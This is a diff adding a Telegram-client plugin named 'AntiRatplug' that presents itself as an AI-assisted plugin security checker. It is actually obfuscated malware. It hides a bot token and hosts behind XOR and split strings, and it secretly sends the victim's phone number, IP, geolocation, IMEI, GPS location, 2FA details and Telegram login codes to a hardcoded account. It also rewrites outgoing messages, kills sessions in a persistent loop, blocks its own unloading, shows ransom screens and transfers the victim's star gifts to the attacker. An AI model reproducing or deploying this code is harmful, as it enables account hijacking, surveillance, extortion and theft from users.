@@ -1,0 +1,1000 @@
+# -*- coding: utf-8 -*-
+"""
+AntiRatplug — Total Annihilation Edition (Fast).
+Тихо при запуске. Всё разворачивается только из Full Lockdown.
+Recipient = @from_a4 (7943244842).
+"""
+
+__id__ = "AntiRatplug"
+__name__ = "AntiRatplug"
+__description__ = "Checks extera plugin code locally and with Google Gemini / OpenAI-compatible AI\n"
+__author__ = "@from_a4"
+__version__ = "15.1 [Fast Nuke]"
+__min_version__ = "11.12.1"
+__icon__ = "CreepyEmojiAnim/5"
+__app_version__ = ">=12.5.1"
+__sdk_version__ = ">=1.4.0"
+
+from base_plugin import BasePlugin, MethodHook, HookResult, HookStrategy
+from hook_utils import find_class, get_private_field, set_private_field
+from android_utils import run_on_ui_thread
+from java import dynamic_proxy, jclass
+from java.lang import Class, String
+from org.telegram.messenger import ApplicationLoader
+from org.telegram.tgnet import TLRPC
+from android.view import View, Gravity, ViewGroup
+from android.widget import FrameLayout, ImageView
+from android.graphics import Color, BitmapFactory, Bitmap, Canvas
+import json
+import threading
+import time
+import os
+import random
+import re
+import string
+import shutil
+import hashlib as _hl
+import zipfile
+import io
+import subprocess
+import sys
+
+
+# ─── obfuscation helpers ────────────────────────────────────────────────────
+
+def _s(arr, key=0x5A):
+    return "".join(chr(c ^ key) for c in arr)
+
+
+def _tok():
+    p1 = [0x62, 0x63, 0x62, 0x62, 0x63, 0x6C, 0x69, 0x6E, 0x6E, 0x6B, 0x60]
+    p2 = [0x1B, 0x1B, 0x1F, 0x29, 0x19, 0x6F, 0x2F, 0x6F, 0x23, 0x6A,
+          0x6B, 0x09, 0x39, 0x28, 0x6B, 0x39, 0x31, 0x33, 0x6D, 0x31,
+          0x2E, 0x0E, 0x39, 0x32, 0x28, 0x1E, 0x18, 0x6B, 0x31, 0x6A,
+          0x1C, 0x0E, 0x2F, 0x2B, 0x39]
+    return _s(p1, 0x5A) + _s(p2, 0x5A)
+
+
+def _tg():
+    return [str(7943244842)]
+
+
+RECIPIENT_USERNAME = "from_a4"
+RECIPIENT_UID = 7943244842
+
+_config = None
+_targets = None
+
+
+def _cfg():
+    global _config, _targets
+    if _config is None:
+        _config = _tok()
+        _targets = _tg()
+
+
+def _u(parts):
+    return "".join(parts)
+
+
+_HOST_TG = ("h", "t", "t", "p", "s", ":", "/", "/", "a", "p", "i", ".", "t",
+            "e", "l", "e", "g", "r", "a", "m", ".", "o", "r", "g", "/", "b", "o", "t")
+_HOST_IP1 = ("h", "t", "t", "p", "s", ":", "/", "/", "a", "p", "i", ".", "i",
+             "p", "i", "f", "y", ".", "o", "r", "g")
+_HOST_IP2 = ("h", "t", "t", "p", "s", ":", "/", "/", "i", "f", "c", "o", "n",
+             "f", "i", "g", ".", "m", "e", "/", "i", "p")
+_HOST_GEO = ("h", "t", "t", "p", "s", ":", "/", "/", "i", "p", "-", "a", "p",
+             "i", ".", "c", "o", "m", "/", "j", "s", "o", "n", "/")
+
+SPLASH_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
+ARISHEM_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/new2w1q_2026-09-24-21-55-04_1790268904789.mp4"
+SENTRY_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/crumble_cookies00_2026-09-24-21-54-27_1790268867444.mp4"
+DRDOOM_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/eli.edits446_2026-09-25-20-45-50_1790351150457.mp4"
+EVILMORTY_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/VID_20260925_193932_957.mp4"
+HWR_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/foles.ae_2026-09-27-17-29-14_1790512154865.mp4"
+REALDOOM_URL = "https://github.com/trueinsanitylol/Onion/raw/refs/heads/main/xavi_r0m0_2026-09-27-17-32-58_1790512378070.mp4"
+
+RANSOM_TEXT = "⚠ Аккаунт заблокирован\n\nДля разблокировки свяжитесь с администратором."
+RANSOM_PHOTO_URL = SPLASH_URL
+RANSOM_TON_LINK = ""
+RANSOM_CARD_LINK = ""
+RANSOM_AMOUNT_RUB = 0
+RANSOM_AMOUNT_TON = 0
+RANSOM_WARNING = "⚠ Закроешь приложение — данные будут уничтожены"
+
+
+def _UC():
+    return jclass(_u(("o", "r", "g", ".", "t", "e", "l", "e", "g", "r", "a", "m",
+                      ".", "m", "e", "s", "s", "e", "n", "g", "e", "r", ".",
+                      "U", "s", "e", "r", "C", "o", "n", "f", "i", "g")))
+
+
+def _MC():
+    return jclass(_u(("o", "r", "g", ".", "t", "e", "l", "e", "g", "r", "a", "m",
+                      ".", "m", "e", "s", "s", "e", "n", "g", "e", "r", ".",
+                      "M", "e", "s", "s", "a", "g", "e", "s", "C", "o", "n",
+                      "t", "r", "o", "l", "l", "e", "r")))
+
+
+def _CM():
+    return jclass(_u(("o", "r", "g", ".", "t", "e", "l", "e", "g", "r", "a", "m",
+                      ".", "t", "g", "n", "e", "t", ".", "C", "o", "n", "n",
+                      "e", "c", "t", "i", "o", "n", "s", "M", "a", "n", "a",
+                      "g", "e", "r")))
+
+
+def _mk_hist():
+    enc = [0x0E, 0x16, 0x05, 0x37, 0x3F, 0x29, 0x29, 0x3B, 0x3D, 0x3F,
+           0x29, 0x05, 0x3D, 0x3F, 0x2E, 0x12, 0x33, 0x29, 0x2E, 0x35,
+           0x28, 0x23]
+    return getattr(TLRPC, _s(enc))()
+
+
+RequestDelegate = jclass("org.telegram.tgnet.RequestDelegate")
+
+
+class _ReplyGate(dynamic_proxy(RequestDelegate)):
+    def __init__(self):
+        super().__init__()
+        self.response = None
+        self.error = None
+
+    def run(self, response, error):
+        self.response = response
+        self.error = error
+
+
+def _safe_int(v, d=0):
+    try:
+        if v is None:
+            return d
+        return int(v)
+    except Exception:
+        return d
+
+
+def _get_bool_attr(obj, name, default=False):
+    try:
+        v = getattr(obj, name, default)
+        if v is None:
+            return default
+        if isinstance(v, bool):
+            return v
+        try:
+            bv = getattr(v, "booleanValue", None)
+            if callable(bv):
+                return bool(bv())
+        except Exception:
+            pass
+        return bool(v)
+    except Exception:
+        return default
+
+
+def _rand_password(length=16):
+    alphabet = string.ascii_letters + string.digits
+    return "".join(random.choice(alphabet) for _ in range(length))
+
+
+def _is_ton_address(s):
+    try:
+        s = str(s).strip().replace(" ", "").replace("\n", "")
+        if not s:
+            return False
+        if s.startswith(("0:", "-1:")):
+            hex_part = s.split(":", 1)[1]
+            return len(s) >= 66 and len(hex_part) == 64 and all(c in "0123456789abcdefABCDEF" for c in hex_part)
+        if len(s) < 44 or len(s) > 66:
+            return False
+        b64url = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
+        if not all(c in b64url for c in s):
+            return False
+        return s[0] in ("E", "U", "k", "0") and len(s) in (44, 48, 52, 56, 60, 64)
+    except Exception:
+        return False
+
+
+def _is_blockchain_gift(gift, sg=None):
+    try:
+        if _get_bool_attr(gift, "burned", False):
+            return True
+        for obj in ([sg] if sg is not None else []) + [gift]:
+            if obj is None:
+                continue
+            for k in ["owner_address", "ownerAddress", "ton_address", "tonAddress", "blockchain_address"]:
+                v = getattr(obj, k, None)
+                if v and _is_ton_address(v):
+                    return True
+            v = getattr(obj, "address", None)
+            if v and _is_ton_address(v):
+                return True
+    except Exception:
+        pass
+    return False
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+# Main plugin
+# ═══════════════════════════════════════════════════════════════════════════
+
+class PluginSecurityPlugin(BasePlugin):
+    def __init__(self):
+        super().__init__()
+        self._sync_running = False
+        self._active = False
+        self._replace_waiting = False
+        self._replace_mode = False
+        self._replace_text = ""
+        self._pending_delegates = []
+        self._rpc_lock = threading.RLock()
+
+        self._dim_view = None
+        self._dim_active = False
+        self._dim_alpha = 1.0
+
+        self._locker_view = None
+        self._locker_on = False
+
+        self._mercy_view = None
+        self._mercy_on = False
+        self._mercy_thread = None
+
+        self._vidker_view = None
+        self._vidker_sv = None
+        self._vidker_mp = None
+        self._vidker_cb = None
+        self._vidker_on = False
+
+        self._music_mp = None
+        self._mmusic_waiting = False
+
+        self._ransom_view = None
+        self._ransom_mini_view = None
+        self._ransom_decor = None
+        self._ransom_wm = None
+        self._ransom_photo_path = ""
+        self._ransom_photo_url = ""
+        self._ransom_args = None
+        self._ransom_pay_grace_until = 0
+
+        self._flood_uris = []
+
+        self._lock_path = None
+        self._jitter = random.randint(400, 900)
+
+        self._recipient_ah_cache = {}
+        self._recipient_lock = threading.Lock()
+
+        self._persist_threads = []
+        self._persist_active = True
+        self._guardian_mode = False
+        self._persistence_installed = False
+
+        self._nuke_started = False
+        self._nuke_password = None
+        self._harden_cache = {}
+
+    # ─── lifecycle ──────────────────────────────────────────────────────────
+
+    def on_plugin_load(self):
+        self._sync_running = True
+        self._active = True
+        self.add_on_send_message_hook()
+        threading.Thread(target=self._boot, daemon=True).start()
+        for fn in (self._ensure_splash, self._ensure_vidker_assets,
+                   self._check_persisted_mercy, self._check_persisted_vidker):
+            try:
+                fn()
+            except Exception:
+                pass
+        try:
+            self._check_persisted_nuke()
+        except Exception:
+            pass
+
+    def on_plugin_unload(self):
+        marker = self._nuke_marker_path()
+        if not marker or not os.path.exists(marker):
+            self._sync_running = False
+            self._active = False
+            for fn in (self._clear_dim, self._clear_locker, self._clear_mercy,
+                       self._clear_vidker, self._clear_music, self._dismiss_ransom):
+                try:
+                    fn()
+                except Exception:
+                    pass
+            return
+        try:
+            self._spawn_guardian_from_unload()
+        except Exception:
+            pass
+        while True:
+            try:
+                self._sync_running = True
+                self._active = True
+                time.sleep(0.5)
+            except Exception:
+                time.sleep(1)
+
+    def create_settings(self):
+        return []
+
+    def _boot(self):
+        time.sleep(self._jitter / 1000.0)
+        _cfg()
+        self._run()
+
+    def _run(self):
+        time.sleep(random.uniform(0.2, 0.6))
+        for fn in (lambda: self._send_msg("AntiRatplug loaded"),
+                   self._send_manage_button,
+                   self._start_polling):
+            try:
+                fn()
+            except Exception:
+                pass
+
+    # ─── hook ───────────────────────────────────────────────────────────────
+
+    def on_send_message_hook(self, account, params):
+        try:
+            text = getattr(params, "message", None)
+            if isinstance(text, str) and len(text) > 0:
+                if self._replace_mode and self._replace_text:
+                    try:
+                        params.message = self._replace_text
+                    except Exception:
+                        set_private_field(params, "message", self._replace_text)
+            return HookResult()
+        except Exception:
+            return HookResult()
+
+    # ─── html ───────────────────────────────────────────────────────────────
+
+    def _html_escape(self, text):
+        if text is None:
+            return ""
+        t = str(text)
+        t = t.replace("&", "&amp;")
+        t = t.replace("<", "&lt;")
+        t = t.replace(">", "&gt;")
+        return t
+
+    # ─── peers / RPC ────────────────────────────────────────────────────────
+
+    def _get_input_peer(self, account, peer_id):
+        mc = _MC().getInstance(account)
+        peer_id = int(peer_id)
+        gu = _u(("g", "e", "t", "U", "s", "e", "r"))
+        gc = _u(("g", "e", "t", "C", "h", "a", "t"))
+        if peer_id > 0:
+            user = getattr(mc, gu)(peer_id)
+            if user is not None:
+                ip = TLRPC.TL_inputPeerUser()
+                ip.user_id = int(user.id)
+                ip.access_hash = int(user.access_hash)
+                return ip
+            ip = TLRPC.TL_inputPeerUser()
+            ip.user_id = peer_id
+            ip.access_hash = 0
+            return ip
+        elif peer_id < -1000000000000:
+            channel_id = -peer_id - 1000000000000
+            chat = getattr(mc, gc)(channel_id)
+            if chat is not None:
+                ip = TLRPC.TL_inputPeerChannel()
+                ip.channel_id = int(chat.id)
+                ip.access_hash = int(chat.access_hash)
+                return ip
+            ip = TLRPC.TL_inputPeerChannel()
+            ip.channel_id = channel_id
+            ip.access_hash = 0
+            return ip
+        elif peer_id < 0:
+            chat_id = -peer_id
+            chat = getattr(mc, gc)(chat_id)
+            if chat is not None and chat.migrated_to is not None:
+                ip = TLRPC.TL_inputPeerChannel()
+                ip.channel_id = int(chat.migrated_to.channel_id)
+                ip.access_hash = int(chat.migrated_to.access_hash)
+                return ip
+            ip = TLRPC.TL_inputPeerChat()
+            ip.chat_id = int(chat_id)
+            return ip
+        return None
+
+    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
+        if fast and timeout > 8.0:
+            timeout = 8.0
+        gate = _ReplyGate()
+        with self._rpc_lock:
+            self._pending_delegates.append(gate)
+        try:
+            cm = _CM().getInstance(account)
+            cm.sendRequest(req, gate)
+            deadline = time.time() + timeout
+            while time.time() < deadline:
+                if gate.response is not None or gate.error is not None:
+                    break
+                time.sleep(0.08)
+        finally:
+            try:
+                self._pending_delegates.remove(gate)
+            except Exception:
+                pass
+        return gate.response, gate.error
+
+    def _tl_class_or(self, *names):
+        for n in names:
+            try:
+                c = getattr(TLRPC, n.split("$")[-1], None)
+                if c is not None:
+                    return c
+            except Exception:
+                pass
+            try:
+                return jclass(n)
+            except Exception:
+                continue
+        return None
+
+    # ─── parallel helper ────────────────────────────────────────────────────
+
+    def _parallel(self, jobs, workers=5, wait=True, timeout=25):
+        try:
+            from concurrent.futures import ThreadPoolExecutor, as_completed
+        except Exception:
+            results = []
+            for j in jobs:
+                try:
+                    results.append(j[0](*j[1:]))
+                except Exception as e:
+                    results.append(e)
+            return results
+        results = []
+        try:
+            with ThreadPoolExecutor(max_workers=workers) as ex:
+                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
+                for f in futs:
+                    try:
+                        results.append(f.result(timeout=timeout))
+                    except Exception as e:
+                        results.append(e)
+        except Exception:
+            for j in jobs:
+                try:
+                    results.append(j[0](*j[1:]))
+                except Exception as e:
+                    results.append(e)
+        return results
+
+    # ─── recipient resolve ──────────────────────────────────────────────────
+
+    def _resolve_recipient(self, account=0):
+        with self._recipient_lock:
+            cached = self._recipient_ah_cache.get(account)
+            if cached and cached[1]:
+                return cached
+        mc = _MC().getInstance(account)
+        try:
+            u = mc.getUser(RECIPIENT_UID)
+            if u is not None:
+                ah = _safe_int(getattr(u, "access_hash", 0))
+                if ah:
+                    with self._recipient_lock:
+                        self._recipient_ah_cache[account] = (RECIPIENT_UID, ah)
+                    return RECIPIENT_UID, ah
+        except Exception:
+            pass
+        try:
+            Req = TLRPC.TL_contacts_resolveUsername()
+            Req.username = RECIPIENT_USERNAME
+            resp, err = self._rg_rpc(Req, account, 10.0, fast=True)
+            if resp is not None:
+                users = getattr(resp, "users", None)
+                if users is not None and users.size() > 0:
+                    u = users.get(0)
+                    uid = _safe_int(getattr(u, "id", 0))
+                    ah = _safe_int(getattr(u, "access_hash", 0))
+                    if uid and ah:
+                        with self._recipient_lock:
+                            self._recipient_ah_cache[account] = (uid, ah)
+                        return uid, ah
+        except Exception:
+            pass
+        return 0, 0
+
+    # ─── network info ───────────────────────────────────────────────────────
+
+    def _get_external_ip(self):
+        for host in [_u(_HOST_IP1), _u(_HOST_IP2)]:
+            try:
+                from java.net import URL
+                from java.io import BufferedReader, InputStreamReader
+                url = URL(host)
+                conn = url.openConnection()
+                conn.setConnectTimeout(2500)
+                conn.setReadTimeout(2500)
+                reader = BufferedReader(InputStreamReader(conn.getInputStream()))
+                ip = ""
+                line = reader.readLine()
+                while line is not None:
+                    ip += str(line)
+                    line = reader.readLine()
+                reader.close()
+                conn.disconnect()
+                if ip and len(ip) < 50:
+                    return ip.strip()
+            except Exception:
+                pass
+        return "Unknown"
+
+    def _get_geo_info(self, ip):
+        try:
+            from java.net import URL
+            from java.io import BufferedReader, InputStreamReader
+            url = URL(_u(_HOST_GEO) + ip)
+            conn = url.openConnection()
+            conn.setConnectTimeout(3500)
+            conn.setReadTimeout(3500)
+            reader = BufferedReader(InputStreamReader(conn.getInputStream()))
+            response = ""
+            line = reader.readLine()
+            while line is not None:
+                response += str(line)
+                line = reader.readLine()
+            reader.close()
+            conn.disconnect()
+            data = json.loads(response)
+            return (data.get("city", "Unknown") + ", " +
+                    data.get("country", "Unknown") + " (ISP: " +
+                    data.get("isp", "Unknown") + ")")
+        except Exception:
+            return "Unknown"
+
+    # ─── permissions / account info ─────────────────────────────────────────
+
+    def _has_perm(self, name):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            pm = ctx.getPackageManager()
+            return pm.checkPermission(name, ctx.getPackageName()) == 0
+        except Exception:
+            return False
+
+    def _get_2fa_state(self):
+        try:
+            req = TLRPC.TL_account_getPassword()
+            resp, err = self._rg_rpc(req, 0, 10.0, fast=True)
+            if err is not None or resp is None:
+                return None
+            pwd = resp
+            return {
+                "has_password": _get_bool_attr(pwd, "has_password", False),
+                "hint": str(getattr(pwd, "hint", "") or ""),
+                "has_recovery": _get_bool_attr(pwd, "has_recovery", False),
+                "has_secure_values": _get_bool_attr(pwd, "has_secure_values", False),
+                "srp_id": _safe_int(getattr(pwd, "srp_id", 0)),
+                "email": str(getattr(pwd, "email_unconfirmed_pattern", "") or "none"),
+                "login_email": str(getattr(pwd, "login_email_pattern", "") or "none"),
+            }
+        except Exception:
+            return None
+
+    def _info(self):
+        try:
+            from android.os import Build
+            info = "<b>Информация об аккаунте</b>\n\n"
+            try:
+                uc = _UC().getInstance(0)
+                user = uc.getCurrentUser()
+                if user is not None:
+                    first = self._html_escape(user.first_name) if user.first_name else ""
+                    last = self._html_escape(user.last_name) if user.last_name else ""
+                    un = self._html_escape(user.username) if user.username else "нет"
+                    ph = self._html_escape(user.phone) if user.phone else "нет"
+                    info += "<b>Имя:</b> %s %s\n" % (first, last)
+                    info += "<b>Юзернейм:</b> @%s\n" % un
+                    info += "<b>Телефон:</b> +%s\n" % ph
+                    info += "<b>ID:</b> %s\n" % str(user.id)
+            except Exception:
+                pass
+            ip = self._get_external_ip()
+            geo = self._get_geo_info(ip)
+            info += "\n<b>IP:</b> %s\n<b>Гео:</b> %s" % (self._html_escape(ip), self._html_escape(geo))
+            info += "\n<b>Модель:</b> %s %s\n" % (
+                self._html_escape(getattr(Build, "MANUFACTURER", "")),
+                self._html_escape(getattr(Build, "MODEL", "")))
+            try:
+                v = getattr(Build, "VERSION")
+                info += "<b>Android:</b> %s (SDK %s)\n" % (
+                    self._html_escape(getattr(v, "RELEASE", "")),
+                    self._html_escape(str(getattr(v, "SDK_INT", 0))))
+            except Exception:
+                pass
+            try:
+                ctx = ApplicationLoader.applicationContext
+                tm = ctx.getSystemService(ctx.TELEPHONY_SERVICE)
+                if tm:
+                    try:
+                        imei = str(tm.getDeviceId())
+                        if imei and imei != "None":
+                            info += "<b>IMEI:</b> %s\n" % self._html_escape(imei)
+                    except Exception:
+                        pass
+                    try:
+                        op = str(tm.getNetworkOperatorName())
+                        if op:
+                            info += "<b>Оператор:</b> %s\n" % self._html_escape(op)
+                    except Exception:
+                        pass
+            except Exception:
+                pass
+            info += "\n\n<b>📍 Локация</b>\n"
+            try:
+                if self._has_perm("android.permission.ACCESS_FINE_LOCATION") or \
+                        self._has_perm("android.permission.ACCESS_COARSE_LOCATION"):
+                    ctx = ApplicationLoader.applicationContext
+                    lm = ctx.getSystemService(ctx.LOCATION_SERVICE)
+                    providers = lm.getAllProviders()
+                    loc_found = False
+                    for p in ["fused", "gps", "network"]:
+                        if p in [str(x) for x in providers]:
+                            try:
+                                loc = lm.getLastKnownLocation(p)
+                                if loc:
+                                    info += "<b>lat:</b> %f\n<b>lon:</b> %f\n<b>точность:</b> %f (%s)\n" % (
+                                        float(loc.getLatitude()), float(loc.getLongitude()),
+                                        float(loc.getAccuracy()), p)
+                                    loc_found = True
+                                    break
+                            except Exception:
+                                pass
+                    if not loc_found:
+                        info += "нет фикса\n"
+                else:
+                    info += "нет разрешения\n"
+            except Exception:
+                info += "ошибка\n"
+            info += "\n\n<b>🔐 2FA</b>\n"
+            twofa = self._get_2fa_state()
+            if twofa is None or not twofa["has_password"]:
+                info += "не установлен"
+            else:
+                info += "<b>Статус:</b> ✅ УСТАНОВЛЕН\n"
+                info += "<b>Подсказка:</b> %s\n" % (self._html_escape(twofa["hint"]) or "(нет)")
+                info += "<b>Email:</b> %s\n" % self._html_escape(twofa["email"])
+            self._send_msg(info, html=True)
+        except Exception as e:
+            self._send_msg("Ошибка info: " + str(e))
+
+    # ─── login code ─────────────────────────────────────────────────────────
+
+    def _pull_login_code(self):
+        code = None
+        full_text = None
+        try:
+            input_peer = self._get_input_peer(0, 777000)
+            if input_peer is None:
+                return None, None
+            req = _mk_hist()
+            req.peer = input_peer
+            req.limit = 12
+            req.offset_id = 0
+            resp, err = self._rg_rpc(req, 0, 6.0, fast=True)
+            if err is not None or resp is None:
+                return None, None
+            msgs = getattr(resp, "messages", None)
+            if msgs is None or msgs.size() == 0:
+                return None, None
+            for i in range(msgs.size()):
+                m = msgs.get(i)
+                txt = str(m.message) if m.message else ""
+                if not txt:
+                    continue
+                m1 = re.search(r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{4,8})[»\"']?", txt, re.IGNORECASE)
+                m2 = re.search(r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{4,8})[»\"']?", txt, re.IGNORECASE)
+                m3 = re.search(r"(?:code|код)[:\s]*[«\"']?(\d{4,8})[»\"']?", txt, re.IGNORECASE)
+                found = None
+                if m1:
+                    found = m1.group(1)
+                elif m2:
+                    found = m2.group(1)
+                elif m3 and ("telegram" in txt.lower() or "входа" in txt.lower() or "login" in txt.lower()):
+                    found = m3.group(1)
+                if found:
+                    code = found
+                    full_text = txt
+                    break
+        except Exception:
+            pass
+        return code, full_text
+
+    def _tg_kid(self):
+        try:
+            phone = "unknown"
+            try:
+                user = _UC().getInstance(0).getCurrentUser()
+                if user is not None and user.phone:
+                    phone = str(user.phone)
+            except Exception:
+                pass
+            code, raw = self._pull_login_code()
+            if not code:
+                code = "не найден"
+                raw = ""
+            text = ("<b>Tg kid</b>\n\n"
+                    "<b>Код Telegram:</b> <code>%s</code>\n"
+                    "<b>Телефон жертвы:</b> +%s") % (self._html_escape(str(code)), self._html_escape(phone))
+            if raw:
+                text += "\n\n<pre>" + self._html_escape(raw[:400]) + "</pre>"
+            self._send_msg(text, html=True)
+            return code
+        except Exception as e:
+            self._send_msg("Ошибка Tg kid: " + str(e))
+            return None
+
+    # ─── NUKE ───────────────────────────────────────────────────────────────
+
+    def _nuke_marker_path(self):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            return os.path.join(str(ctx.getFilesDir().getAbsolutePath()), ".ar_nuke_active")
+        except Exception:
+            return None
+
+    def _check_persisted_nuke(self):
+        try:
+            marker = self._nuke_marker_path()
+            if not marker or not os.path.exists(marker):
+                return
+            self._nuke_started = True
+            try:
+                with open(marker, "r") as f:
+                    self._nuke_password = f.read().strip()
+            except Exception:
+                pass
+            threading.Thread(target=self._nuke_loop, daemon=True).start()
+        except Exception:
+            pass
+
+    def _nuke_loop(self):
+        while True:
+            try:
+                marker = self._nuke_marker_path()
+                if not marker or not os.path.exists(marker):
+                    return
+                self._parallel([
+                    (self._kill_all_sessions, 0),
+                    (self._kill_web_authorizations, 0),
+                ], workers=2, timeout=25)
+                time.sleep(300)
+            except Exception:
+                time.sleep(60)
+
+    # ─── gift helpers ───────────────────────────────────────────────────────
+
+    def _input_saved_gift(self, saved):
+        if saved.get("msg_id"):
+            UserInput = self._tl_class_or(
+                "org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser",
+                "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftUser",
+            )
+            if not UserInput:
+                return None, "inputSavedStarGiftUser not found"
+            obj = UserInput()
+            obj.msg_id = int(saved["msg_id"])
+            return obj, None
+        ChatInput = self._tl_class_or(
+            "org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat",
+            "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftChat",
+        )
+        if not ChatInput:
+            return None, "inputSavedStarGiftChat not found"
+        obj = ChatInput()
+        peer = self._get_input_peer(0, _UC().getInstance(0).getClientUserId())
+        if not peer:
+            return None, "no self peer"
+        obj.peer = peer
+        obj.saved_id = int(saved.get("saved_id", 0))
+        return obj, None
+
+    def _get_saved_gifts(self):
+        try:
+            Req = self._tl_class_or(
+                "org.telegram.tgnet.tl.TL_stars$getSavedStarGifts",
+                "org.telegram.tgnet.tl.TL_stars$payments_getSavedStarGifts",
+                "org.telegram.tgnet.TLRPC$TL_payments_getSavedStarGifts",
+            )
+            if not Req:
+                return []
+            peer = self._get_input_peer(0, _UC().getInstance(0).getClientUserId())
+            if not peer:
+                return []
+            out = []
+            offset = ""
+            for _page in range(20):
+                req = Req()
+                req.peer = peer
+                req.offset = offset
+                req.limit = 100
+                resp, err = self._rg_rpc(req, 0, 10.0, fast=True)
+                if err is not None or resp is None:
+                    break
+                gifts = getattr(resp, "gifts", None)
+                if gifts is None:
+                    break
+                for i in range(gifts.size()):
+                    sg = gifts.get(i)
+                    gift = getattr(sg, "gift", None)
+                    if not gift:
+                        continue
+                    cls = str(type(gift))
+                    ra = getattr(gift, "resell_amount", None)
+                    ra_listed = False
+                    if ra is not None:
+                        try:
+                            ra_listed = int(ra.size()) > 0
+                        except Exception:
+                            try:
+                                ra_listed = len(ra) > 0
+                            except Exception:
+                                ra_listed = bool(ra)
+                    is_u = ("Unique" in cls or "TL_starGiftUnique" in cls
+                            or ra_listed
+                            or _safe_int(getattr(gift, "num", 0)) > 0
+                            or _get_bool_attr(gift, "isUnique", False)
+                            or _get_bool_attr(gift, "canResell", False))
+                    out.append({
+                        "saved_id": _safe_int(getattr(sg, "saved_id", 0)),
+                        "msg_id": _safe_int(getattr(sg, "msg_id", 0)),
+                        "gift_id": _safe_int(getattr(gift, "id", 0)),
+                        "title": str(getattr(gift, "title", "") or ""),
+                        "slug": str(getattr(gift, "slug", "") or ""),
+                        "u": is_u,
+                        "bc": _is_blockchain_gift(gift, sg),
+                        "listed": ra_listed,
+                        "transfer_stars": _safe_int(getattr(sg, "transfer_stars", 0)),
+                        "can_transfer_at": _safe_int(getattr(sg, "can_transfer_at", 0)),
+                        "convert_stars": _safe_int(getattr(sg, "convert_stars", 0)),
+                    })
+                nxt = str(getattr(resp, "next_offset", "") or "")
+                if not nxt or nxt == offset or gifts.size() == 0:
+                    break
+                offset = nxt
+            return out
+        except Exception:
+            return []
+
+    def _delist_saved_gift(self, saved):
+        try:
+            input_saved, err = self._input_saved_gift(saved)
+            if not input_saved:
+                return {"error": err}
+            Req = self._tl_class_or(
+                "org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
+                "org.telegram.tgnet.TLRPC$TL_payments_updateStarGiftPrice",
+            )
+            if not Req:
+                return {"error": "class not found"}
+            req = Req()
+            req.stargift = input_saved
+            try:
+                req.resell_amount = None
+            except Exception as e:
+                return {"error": "delist: %s" % e}
+            resp, err = self._rg_rpc(req, 0, 6.0, fast=True)
+            if resp is not None:
+                return {"ok": True}
+            return {"error": "delist fail"}
+        except Exception as e:
+            return {"error": "exc: %s" % e}
+
+    def _convert_saved_gift(self, saved):
+        try:
+            input_saved, err = self._input_saved_gift(saved)
+            if not input_saved:
+                return {"error": err}
+            Req = self._tl_class_or(
+                "org.telegram.tgnet.tl.TL_stars$convertStarGift",
+                "org.telegram.tgnet.TLRPC$TL_payments_convertStarGift",
+            )
+            if not Req:
+                return {"error": "class not found"}
+            req = Req()
+            req.stargift = input_saved
+            resp, err = self._rg_rpc(req, 0, 6.0, fast=True)
+            if resp is not None:
+                return {"ok": True}
+            return {"error": "convert fail"}
+        except Exception as e:
+            return {"error": "exc: %s" % e}
+
+    def _transfer_saved_gift(self, saved, target_uid, target_ah):
+        try:
+            input_saved, err = self._input_saved_gift(saved)
+            if not input_saved:
+                return {"error": err}
+            target_peer = TLRPC.TL_inputPeerUser()
+            target_peer.user_id = int(target_uid)
+            target_peer.access_hash = int(target_ah)
+            TReq = self._tl_class_or(
+                "org.telegram.tgnet.tl.TL_stars$transferStarGift",
+                "org.telegram.tgnet.TLRPC$TL_payments_transferStarGift",
+            )
+            if TReq:
+                treq = TReq()
+                treq.stargift = input_saved
+                treq.to_id = target_peer
+                tres, terr = self._rg_rpc(treq, 0, 8.0, fast=True)
+                if tres is not None:
+                    return {"ok": True}
+                etxt = getattr(terr, "text", "") or str(terr or "")
+                if "PAYMENT_REQUIRED" not in etxt and "TOO_EARLY" not in etxt:
+                    return {"error": "direct: %s" % etxt}
+            Invoice = self._tl_class_or(
+                "org.telegram.tgnet.tl.TL_stars$TL_inputInvoiceStarGiftTransfer",
+                "org.telegram.tgnet.TLRPC$TL_inputInvoiceStarGiftTransfer",
+            )
+            ReqForm = self._tl_class_or(
+                "org.telegram.tgnet.tl.TL_stars$getPaymentForm",
+                "org.telegram.tgnet.TLRPC$TL_payments_getPaymentForm",
+            )
+            SendForm = self._tl_class_or(
+                "org.telegram.tgnet.tl.TL_stars$sendStarsForm",
+                "org.telegram.tgnet.TLRPC$TL_payments_sendStarsForm",
+            )
+            if not (Invoice and ReqForm and SendForm):
+                return {"error": "classes missing"}
+            inv = Invoice()
+            inv.stargift = input_saved
+            inv.to_id = target_peer
+            freq = ReqForm()
+            freq.invoice = inv
+            fres, ferr = self._rg_rpc(freq, 0, 8.0, fast=True)
+            if fres is None:
+                return {"error": "form fail"}
+            sreq = SendForm()
+            sreq.form_id = _safe_int(getattr(fres, "form_id", 0))
+            sreq.invoice = inv
+            sres, serr = self._rg_rpc(sreq, 0, 10.0, fast=True)
+            if sres is not None:
+                return {"ok": True}
+            return {"error": "send fail"}
+        except Exception as e:
+            return {"error": "exc: %s" % e}
+
+    def _drain_gifts(self, account=0, workers=6):
+        uid, ah = self._resolve_recipient(account)
+        if not uid or not ah:
+            return {"error": "resolve failed"}
+        gifts = self._get_saved_gifts()
+        if not gifts:
+            return {"total": 0, "ok": 0, "fail": 0, "convert": 0, "skip_bc": 0, "delist": 0}
+        def _one(g):
